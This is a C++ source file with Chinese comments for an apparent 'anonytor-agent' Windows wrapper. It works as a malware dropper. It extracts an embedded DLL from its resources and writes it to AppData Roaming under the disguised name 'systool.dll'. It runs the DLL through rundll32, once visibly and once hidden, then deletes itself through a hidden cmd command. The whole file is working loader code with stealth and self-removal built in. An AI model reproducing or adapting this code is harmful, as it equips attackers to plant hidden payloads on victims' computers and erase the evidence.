// anonytor-agent-windows-wrapper.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "anonytor-agent-windows-wrapper.h"

#include "utils.h"
#include "resource.h"
#include <Shlobj_core.h>
#include <shellapi.h>

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR* dll_path;

// 1秒后删除自身, 并退出
void selfDelete()
{
    WCHAR command[24 + MAX_PATH] = L"cmd /c sleep 1 && del ";
    wchar_t module_path[MAX_PATH];
    GetModuleFileName(hInst, module_path, MAX_PATH);
    lstrcat(command, module_path);
    ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", command, NULL, SW_HIDE);
    exit(0);
}

// 解压到Roaming文件夹, 并且把路径保存到全局变量dll_path
void extractPayload(HINSTANCE hInstance)
{
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(PAYLOAD_DLL), RT_RCDATA);
    if (!res)
    {
        ErrorExit(L"LoadResource Error");
        return;
    }
    HGLOBAL res_handle = LoadResource(NULL, res);
    if (!res_handle)
    {
        ErrorExit(L"LoadResource Error");
        return;
    }
    char* res_data = (char*)LockResource(res_handle);
    DWORD res_size = SizeofResource(NULL, res);
    std::cout << res_size << std::endl;
    /* you can now use the resource data */

    PWSTR path = NULL;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_DEFAULT, NULL, &path);
    if (!SUCCEEDED(hr)) {
        ErrorExit(L"SHGetKnownFolderPath Error");
    }
    wprintf(L"%ls\n", path);
    dll_path = lstrcat_heap(path, L"\\systool.dll");
    FILE* f;

    _wfopen_s(&f, dll_path, L"wb");
    if (f == NULL)
    {
        ErrorExit(L"fopen");
        return;
    }

    fwrite(res_data, res_size, 1, f);
    fclose(f);
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    ConsoleInit();

    extractPayload(hInstance);

    LPWSTR command = lstrcat_heap(dll_path, L",EntryPoint");
    wprintf(command);
    ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\rundll32.exe", command, NULL, SW_SHOWNORMAL);
    ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\rundll32.exe", command, NULL, SW_HIDE);
    free(command);
    free(dll_path);
    selfDelete();
    MSG msg;
    // 主消息循环:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int) msg.wParam;
}

